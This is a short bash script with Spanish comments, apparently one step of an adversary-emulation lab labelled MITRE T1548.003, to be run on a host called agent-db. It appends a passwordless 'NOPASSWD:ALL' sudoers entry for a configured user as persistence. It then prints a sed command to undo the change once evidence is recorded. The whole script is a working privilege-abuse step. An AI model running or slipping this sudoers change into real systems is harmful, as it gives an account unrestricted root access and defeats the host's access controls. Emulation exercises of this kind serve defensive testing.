#!/usr/bin/env bash
# Correr DENTRO de agent-db, con el privilegio que haya dado el paso anterior.
source "$(dirname "$0")/../config.sh"
echo "[T1548.003] Agregando entrada de persistencia a sudoers para $SSH_USER"
echo "$SSH_USER ALL=(ALL) NOPASSWD:ALL" | sudo tee -a /etc/sudoers
echo "Para revertir después de grabar evidencia:"
echo "  sudo sed -i '/^$SSH_USER ALL=(ALL) NOPASSWD:ALL\$/d' /etc/sudoers"
